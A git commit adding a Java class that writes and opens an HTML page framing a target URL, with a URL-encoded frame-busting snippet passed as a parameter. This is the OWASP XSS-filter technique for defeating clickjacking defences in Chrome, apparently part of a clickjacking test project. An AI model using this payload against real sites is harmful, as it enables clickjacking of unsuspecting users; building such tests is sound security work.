54c0a1acfa835ab81ab4fbdb53e63c69d2a97b17
JVALPASS <51170999+JVALPASS@users.noreply.github.com>
2021-05-13 22:56:42 +0200

    feat: Implementation of ClickJacking tecnique FilterXssChrome
    Description: I have implemented this class that has methods that manage and create in dinamic way an Html file, that implement a clickjacking FilterXSS tecnique for browser Chrome, that is described in Owasp

---
+++ ClickjackingTest/src/main/java/com/dependability/clickjacking/cration/filterXss/chrome/FilterXssChrome.java
@@ -0,0 +1,56 @@
+package com.dependability.clickjacking.cration.filterXss.chrome;
+
+import java.awt.Desktop;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+import com.dependability.clickjacking.clickInterface.ClickJacking;
+
+public class FilterXssChrome implements ClickJacking{
+	private String src;
+	private File f;
+	
+	FilterXssChrome(String src){
+		this.src = src;
+		f = new File("src\\main\\webapp\\filter_xss_chrome.html");
+	}
+	
+	@Override
+	public String getSrc() {
+		return src;
+	}
+	
+	@Override
+	public void setSrc(String src) {
+		this.src = src;
+		
+	}
+	
+	@Override
+	public File getHtmlFile() {
+		return f;
+	}
+	
+	@Override
+	public void setHtmlFile(File f) {
+		this.f = f;
+	}
+	
+	
+	@Override
+	public void creation() throws IOException {
+        BufferedWriter bw = new BufferedWriter(new FileWriter(f));
+        bw.write("<html><body>");
+        bw.write("<iframe src="+src+"\\?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D"+"></iframe>");
+        bw.write("</body></html>");
+        bw.close();		
+	}
+	
+	@Override
+	public void run() throws IOException {
+		Desktop.getDesktop().browse(f.toURI());
+	}
+	
+}
